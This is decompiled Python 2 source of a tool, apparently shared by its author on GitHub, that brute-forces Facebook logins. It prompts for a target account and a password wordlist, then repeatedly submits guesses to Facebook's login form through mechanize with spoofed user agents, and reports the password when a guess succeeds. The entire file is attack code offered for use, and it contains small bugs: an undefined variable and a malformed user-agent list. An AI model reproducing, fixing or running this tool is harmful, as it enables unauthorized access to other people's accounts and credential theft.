# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: dg
import os, sys, mechanize, cookielib, random
logo = '\n\x1b[1;91m__________________ \n\x1b[1;92m| ___ \\  ___|  ___|\n\x1b[1;93m| |_/ / |_  | |_   \n\x1b[1;95m| ___ \\  _| |  _|  \n\x1b[1;96m| |_/ / |   | |    \n\x1b[1;91m\\____/\\_|   \\_|  \x1b[1;97mBrute Force Facebook\n\x1b[1;97m--------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : Angga Kurniawan     \n\x1b[1;97m\xe2\x9e\xa3 GitHub   : https://github.com/anggaxd\n\x1b[1;97m\xe2\x9e\xa3 YouTube  : ANGGA KURNIAWAN\n\x1b[1;97m--------------------------------------------\n                     \n'
os.system('clear')
print logo
email = str(raw_input('Target Username / ID Facebook : '))
passwordlist = str(raw_input('Enter the wordlist name and path : '))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [
 ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    global br
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    search()
    print 'Password does not exist in the wordlist'


def brute(password):
    sys.stdout.write(('\r[*] Trying ..... {}\n').format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and 'login_attempt' not in log:
        print ('\n\n[+] Password Find = {}').format(password)
        raw_input('ANY KEY to Exit....')
        sys.exit(1)


def search():
    global password
    passwords = open(passwordlist, 'r')
    for password in passwords:
        password = password.replace('\n', '')
        brute(password)

    total = open(passwordlist, 'r')
    total = total.readlines()
    print wel
    print (' [*] Account to crack : {}').format(email)
    print ' [*] Loaded :', len(total), 'passwords'
    print ' [*] Cracking, please wait ...\n\n'


if __name__ == '__main__':
    main()